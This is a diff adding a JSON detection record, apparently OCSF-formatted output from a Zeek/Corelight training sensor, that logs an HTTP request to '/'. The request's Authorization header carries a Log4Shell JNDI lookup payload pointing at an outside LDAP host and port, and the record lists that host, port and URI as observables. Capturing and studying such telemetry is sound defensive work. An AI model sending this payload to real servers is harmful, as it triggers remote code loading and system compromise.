@@ -1,0 +1,47 @@
+{
+  "metadata": {
+    "version": "1.3.0",
+    "product": {
+      "name": "Zeek",
+      "vendor_name": "Corelight"
+    },
+    "logged_time": 1704847123,
+    "loggers": [
+      {
+        "name": "sensor.cyberlab-20250109a-classic.training.corelight.io"
+      }
+    ],
+    "uid": "C6JWdp1PAAxyF0wBbg"
+  },
+  "category_uid": 2,
+  "class_uid": 2004,
+  "activity_id": 1,
+  "time": 1704847123,
+  "finding_info": {
+    "title": "AUTHORIZATION"
+  },
+  "message": "Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}",
+  "http_request": {
+    "url": "/"
+  },
+  "severity_id": 4,
+  "status_id": 2,
+  "observables": [
+    {
+      "value": "45.83.193.150",
+      "type": "hostname"
+    },
+    {
+      "value": "1389",
+      "type": "port"
+    },
+    {
+      "value": "45.83.193.150:1389/Exploit",
+      "type": "uri"
+    },
+    {
+      "value": "45.83.193.150:1389",
+      "type": "hostname"
+    }
+  ]
+}
